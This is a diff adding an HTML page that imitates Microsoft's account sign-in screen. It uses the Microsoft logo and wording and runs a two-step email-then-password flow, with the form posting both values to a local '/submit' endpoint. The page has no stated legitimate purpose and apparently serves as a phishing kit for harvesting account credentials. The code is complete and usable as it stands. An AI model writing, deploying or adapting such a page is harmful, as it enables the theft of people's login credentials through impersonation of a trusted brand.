@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Sign in to your account</title>
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      background: #f3f3f3;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .container {
+      background: white;
+      width: 440px;
+      min-height: 460px;
+      padding: 40px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+      border-radius: 5px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .logo-container {
+      display: flex;
+      align-items: center;
+      margin-bottom: 10px;
+    }
+
+    .logo-container img {
+      height: 30px;
+      margin-right: 10px;
+    }
+
+    .logo-container span {
+      font-size: 22px;
+      font-weight: 400;
+      color: #737373;
+    }
+
+    h1 {
+      font-weight: 500;
+      font-size: 26px;
+      color: #333;
+      margin: 20px 0 10px;
+    }
+
+    .subtitle {
+      font-size: 14px;
+      color: #666;
+      margin-bottom: 30px;
+    }
+
+    input[type="email"], input[type="password"] {
+      width: 100%;
+      font-size: 15px;
+      border: none;
+      border-bottom: 1px solid #999;
+      padding: 10px 4px;
+      margin-bottom: 10px;
+      background: transparent;
+    }
+
+    input:focus {
+      outline: none;
+      border-bottom: 2px solid #0078d7;
+    }
+
+    .link-group {
+      font-size: 12px;
+      margin: 10px 0 20px;
+    }
+
+    .no-account {
+      color: #000;
+    }
+
+    .create-link {
+      color: #0078d7;
+      text-decoration: none;
+      margin-left: 6px;
+    }
+
+    .create-link:hover {
+      text-decoration: underline;
+    }
+
+    .link-group a.extra-link {
+      display: block;
+      color: #0078d7;
+      text-decoration: none;
+      margin-top: 10px;
+    }
+
+    .link-group a.extra-link:hover {
+      text-decoration: underline;
+    }
+
+    button {
+      width: 100%;
+      background-color: #0078d7;
+      border: none;
+      padding: 12px;
+      color: white;
+      font-weight: 600;
+      font-size: 16px;
+      border-radius: 3px;
+      cursor: pointer;
+      margin-top: 24px;
+    }
+
+    button:hover {
+      background-color: #005a9e;
+    }
+
+    .form-section {
+      position: absolute;
+      top: 80px;
+      left: 0;
+      width: 100%;
+      padding: 0 40px;
+      box-sizing: border-box;
+      transition: transform 0.4s ease, opacity 0.4s ease;
+      opacity: 0;
+      pointer-events: none;
+    }
+
+    .form-section.active {
+      opacity: 1;
+      pointer-events: all;
+      transform: translateX(0%);
+      z-index: 2;
+    }
+
+    .form-section.hidden-left {
+      transform: translateX(-100%);
+      opacity: 0;
+      z-index: 1;
+    }
+
+    .form-section.hidden-right {
+      transform: translateX(100%);
+      opacity: 0;
+      z-index: 1;
+    }
+
+    .user-email {
+      font-size: 14px;
+      color: #444;
+      margin: 0 auto 20px;
+      text-align: center;
+      background-color: #f0f0f0;
+      padding: 8px 16px;
+      border-radius: 25px;
+      width: fit-content;
+    }
+
+    .back-link {
+      font-size: 13px;
+      color: #0078d7;
+      text-decoration: none;
+      display: inline-block;
+      margin-bottom: 10px;
+    }
+
+    .back-link:hover {
+      text-decoration: underline;
+    }
+
+    .password-container {
+      position: relative;
+    }
+
+    .toggle-password {
+      position: absolute;
+      right: 8px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      width: 20px;
+      height: 20px;
+      background-image: url('data:image/svg+xml;utf8,<svg fill="gray" height="20" viewBox="0 0 24 24" width="20" xmlns="http://www.w3.org/2000/svg"><path d="M12 4.5C7 4.5 2.7 7.6 1 12c1.7 4.4 6 7.5 11 7.5s9.3-3.1 11-7.5C21.3 7.6 17 4.5 12 4.5zm0 12c-2.5 0-4.5-2-4.5-4.5S9.5 7.5 12 7.5 16.5 9.5 16.5 12 14.5 16.5 12 16.5zm0-7c-1.4 0-2.5 1.1-2.5 2.5S10.6 14.5 12 14.5s2.5-1.1 2.5-2.5S13.4 9.5 12 9.5z"/></svg>');
+      background-size: contain;
+      background-repeat: no-repeat;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <form id="login-form" method="post" action="/submit">
+      <div class="logo-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" />
+        <span>Microsoft</span>
+      </div>
+
+      <!-- Email Step -->
+      <div id="email-section" class="form-section active">
+        <h1>Sign in</h1>
+        <div class="subtitle">to continue to Microsoft</div>
+        <input type="email" id="email" name="email" placeholder="Email, phone, or Skype" required />
+        <div class="link-group">
+          <span class="no-account">No account?</span><a class="create-link" href="#">Create one!</a>
+          <a class="extra-link" href="#">Can’t access your account?</a>
+        </div>
+        <button type="button" onclick="nextStep()">Next</button>
+      </div>
+
+      <!-- Password Step -->
+      <div id="password-section" class="form-section hidden-right">
+        <a class="back-link" href="javascript:void(0)" onclick="goBack()">← Back</a>
+        <div class="user-email" id="displayed-email"></div>
+        <h1>Enter password</h1>
+        <div class="password-container">
+          <input type="password" id="password" name="password" placeholder="Password" required />
+          <!-- <span class="toggle-password" onclick="togglePasswordVisibility()"></span> -->
+        </div>
+        <button type="submit">Sign in</button>
+      </div>
+    </form>
+  </div>
+
+  <script>
+    const emailSection = document.getElementById("email-section");
+    const passwordSection = document.getElementById("password-section");
+    const displayedEmail = document.getElementById("displayed-email");
+    const passwordInput = document.getElementById("password");
+    const emailInput = document.getElementById("email");
+
+    function nextStep() {
+      const email = emailInput.value.trim();
+      if (!email) {
+        alert("Please enter your email.");
+        return;
+      }
+      displayedEmail.textContent = email;
+
+      emailSection.classList.remove("active");
+      emailSection.classList.add("hidden-left");
+      passwordSection.classList.remove("hidden-right");
+      passwordSection.classList.add("active");
+      passwordInput.focus();
+    }
+
+    function goBack() {
+      passwordSection.classList.remove("active");
+      passwordSection.classList.add("hidden-right");
+
+      emailSection.classList.remove("hidden-left");
+      emailSection.classList.add("active");
+      emailInput.focus();
+    }
+
+    function togglePasswordVisibility() {
+      passwordInput.type = passwordInput.type === "password" ? "text" : "password";
+    }
+
+    emailInput.addEventListener("keydown", function(e) {
+      if (e.key === "Enter") {
+        e.preventDefault();
+        nextStep();
+      }
+    });
+
+    passwordInput.addEventListener("keydown", function(e) {
+      if (e.key === "Enter") {
+        e.preventDefault();
+        document.getElementById("login-form").submit();
+      }
+    });
+  </script>
+</body>
+</html>
+
+
